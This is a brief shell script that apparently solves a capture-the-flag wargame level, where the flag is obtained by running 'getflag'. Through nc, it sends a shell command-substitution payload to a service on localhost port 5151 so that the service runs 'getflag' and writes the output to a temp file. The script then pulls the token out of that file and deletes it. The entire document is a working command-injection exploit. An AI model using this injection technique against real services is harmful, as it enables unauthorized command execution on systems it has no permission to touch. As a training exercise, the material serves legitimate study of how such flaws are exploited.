#!/bin/sh -eu

GETFLAG_OUTPUT=/tmp/getflag_output

echo "\$( getflag >${GETFLAG_OUTPUT} )" \
| nc localhost 5151

grep -oE '[^ ]+$' ${GETFLAG_OUTPUT} >/tmp/token

rm -f ${GETFLAG_OUTPUT}
